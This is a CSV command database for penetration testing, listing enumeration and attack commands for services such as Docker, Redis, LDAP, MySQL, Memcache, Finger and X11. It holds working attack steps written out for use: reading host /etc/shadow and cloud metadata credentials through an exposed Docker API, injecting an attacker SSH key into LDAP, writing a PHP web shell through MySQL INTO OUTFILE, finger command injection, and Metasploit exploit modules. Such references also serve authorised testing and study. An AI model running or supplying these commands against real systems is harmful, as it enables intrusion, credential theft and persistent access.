Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
Docker,2375,None,NoNameAdded,No Description,"#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance""]}'
#Get the output
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""mount""]}'
#Get the output by starting the exec
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H ""Content-Type: application/json"" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /run/secrets/registry-key.key""]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket2376/containers/create?name=test -d '{""Image"":""alpine"", ""Cmd"":[""/usr/bin/tail"", ""-f"", ""1234"", ""/dev/null""], ""Binds"": [ ""/:/mnt"" ], ""Privileged"": true}'
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ ""AttachStdin"": false, ""AttachStdout"": true, ""AttachStderr"": true, ""Cmd"": [""/bin/sh"", ""-c"", ""cat /mnt/etc/shadow""]}'
curl –insecure -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H ""Content-Type: application/json"" https://tls-opendocker.socket:2376/containers/prune
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"# msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script ""docker-*"" -p <PORT> <IP>
",Unverified,1
Docker,2375,None,NoNameAdded,No Description,"docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"nmap --script redis-info -sV -p 6379 {IP}
msf> use auxiliary/scanner/redis/redis_server
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"# nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"AUTH <username> <password>
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
",Unverified,1
Redis,6379,None,NoNameAdded,No Description,"# SELECT 1
[ ... Indicate the database ... ]
KEYS * 
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts: 
dc=DOMAIN,dc=DOMAIN
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"nmap -n -sV --script ""ldap* and not brute"" {IP} #Using anonymous credentials
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# >>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '' -w '' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"## CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""DC=<1_SUBDOMAIN>,DC=<TDL>""
-x Simple Authentication
-h LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
#Example: ldapsearch -x -h {IP} -D 'MYDOM\john' -w 'johnpassw' -b ""CN=Users,DC=mydom,DC=local""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"ldapsearch -x -h {IP} -D '<DOMAIN>\<username>' -w '<password>' -b ""CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# <ldapsearchcmd...> | grep -i -A2 -B2 ""userpas""
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do ./list-groups-for-user ""$name""; echo -e ""========================\n""; done

#Get users of a group
./enum-members --by-name ""domain admins""
./lsa enum-members --by-name ""domain admins""
#Get users of each group
./enum-groups | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do echo ""$name""; ./enum-members --by-name ""$name""; echo -e ""========================\n""; done

#Get description of each user
./adtool -a search-user --name CN=""*"" --keytab=/etc/krb5.keytab -n <Username> | grep ""CN"" | while read line; do
    echo ""$line"";
    ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn=""$line"" --attr ""description"";
    echo ""======================""
done
",Unverified,1
LDAP,389,None,NoNameAdded,No Description,"# cat /var/lib/ldap/*.bdb | grep -i -a -E -o ""description.*"" | sort | uniq -u
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"echo ""version"" | nc -vn -w 1 {IP} 11211      #Get version
echo ""stats"" | nc -vn -w 1 {IP} 11211        #Get status
echo ""stats slabs"" | nc -vn -w 1 {IP} 11211  #Get slabs
echo ""stats items"" | nc -vn -w 1 {IP} 11211  #Get items of slabs with info
echo ""stats cachedump <number> 0"" | nc -vn -w 1 {IP} 11211  #Get key names (the 0 is for unlimited output size)
echo ""get <item_name>"" | nc -vn -w 1 {IP} 11211  #Get saved info

#This php will just dump the keys, you need to use ""get <item_name> later""
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer(""localhost"", 11211); var_dump( $c->getAllKeys() );'
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"# sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
",Unverified,1
Memcache,11211,None,NoNameAdded,No Description,"nmap -n -sV --script memcached-info -p 11211 {IP}   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"# nc -vn {IP} 22
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"usage: ssh-audit.py [-1246pbcnjvlt] <host>

   -1,  --ssh1             force ssh version 1 only
   -2,  --ssh2             force ssh version 2 only
   -4,  --ipv4             enable IPv4 (order of precedence)
   -6,  --ipv6             enable IPv6 (order of precedence)
   -p,  --port=<port>      port to connect
   -b,  --batch            batch output
   -c,  --client-audit     starts a server on port 2222 to audit client
                               software config (use -p to change port;
                               use -t to change timeout)
   -n,  --no-colors        disable colors
   -j,  --json             JSON output
   -v,  --verbose          verbose output
   -l,  --level=<level>    minimum output level (info|warn|fail)
   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading
                               (default: 5)
$ python3 ssh-audit <IP>
",Unverified,1
SSH/SFTP,22,None,NoNameAdded,No Description,"ssh-keyscan -t rsa {IP} -p <PORT>
",Unverified,1
RMI,1098,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/misc/java_rmi_server
msf> use auxiliary/gather/java_rmi_registry
nmap -sV --script ""rmi-dumpregistry or rmi-vuln-classloader"" -p <PORT> <IP>
",Unverified,1
RMI,1098,None,NoNameAdded,No Description,"# msf> use exploit/multi/browser/java_rmi_connection_impl
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"# nc -vn {IP} <PORT>
openssl s_client -connect {IP}:<PORT> -quiet
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"#Connection with random nickname
USER ran213eqdw123 0 * ran213eqdw123
NICK ran213eqdw123
#If a PING :<random> is responded you need to send
#PONG :<received random>

VERSION
HELP
INFO
LINKS
HELPOP USERCMDS
HELPOP OPERCMDS
OPERATOR CAPA
ADMIN      #Admin info
USERS      #Current number of users
TIME       #Server's time
STATS a    #Only operators should be able to run this
NAMES      #List channel names and usernames inside of each channel -> Nombre del canal y nombre de las personas que estan dentro
LIST       #List channel names along with channel banner
WHOIS <USERNAME>      #WHOIS a username
USERHOST <USERNAME>   #If available, get hostname of a user
USERIP <USERNAME>     #If available, get ip of a user
JOIN <CHANNEL_NAME>   #Connect to a channel

#Operator creds Brute-Force
OPER <USERNAME> <PASSWORD>
",Unverified,1
IRC,194,None,NoNameAdded,No Description,"nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {IP}
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"CONVERT(unhex(""6f6e2e786d6c55540900037748b75c7249b75""), BINARY)
CONVERT(from_base64(""aG9sYWFhCg==""), BINARY)
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# show databases;
use <database>;
show tables;
describe <table_name>;

select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
select user,file_priv from mysql.user where user='root'; #File privileges
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Try to execute code
select do_system('id');
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name=""<TABLE NAME>""

#Read & Write
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,""<?php echo shell_exec($_GET['c']);?>"",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"load data local infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql> load data infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v ""#"" | grep ""user""
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"mysql -u root --password=<PASSWORD> -e ""SELECT User,Host,authentication_string FROM mysql.user;""
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/debian.cnf
",Unverified,1
Mysql,3306,None,NoNameAdded,No Description,"# grep -oaE ""[-_\.\*a-Z0-9]{3,}"" /var/lib/mysql/mysql/user.MYD | grep -v ""mysql_native_password""
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"# nc -vn {IP} 79
echo ""root"" | nc -vn {IP} 79
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"# finger-user-enum.pl -U users.txt -t 10.0.0.1
finger-user-enum.pl -u root -t 10.0.0.1
finger-user-enum.pl -U users.txt -T ips.txt
",Unverified,1
Finger,79,None,NoNameAdded,No Description,"finger ""|/bin/id@example.com""
finger ""|/bin/ls -a /@example.com""
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"nmap -sV --script x11-access -p <PORT> {IP}
msf> use auxiliary/scanner/x11/open_x11
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"xwd -root -screen -silent -display <Target{IP}:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
",Unverified,1
X11,6000,None,NoNameAdded,No Description,"# ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
",Unverified,1
MSRPC,135,None,NoNameAdded,No Description,"# use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
rpcdump.py <IP> -p 135
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# nc -nv {IP} 143
openssl s_client -connect {IP}:993 -quiet
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'UID SEARCH ALL' --user user:pass
$ curl -k 'imaps://1.2.3.4/INBOX;UID=1' --user user:pass
",Unverified,1
IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2>&1 | grep '^<'
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"ntpq -c readlist <{IP}_ADDRESS>
ntpq -c readvar <{IP}_ADDRESS>
ntpq -c peers <{IP}_ADDRESS>
ntpq -c associations <{IP}_ADDRESS>
ntpdc -c monlist <{IP}_ADDRESS>
ntpdc -c listpeers <{IP}_ADDRESS>
ntpdc -c sysinfo <{IP}_ADDRESS>
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}
",Unverified,1
NTP,123,None,NoNameAdded,No Description,"ntpdc -n -c monlist {IP}
",Unverified,1
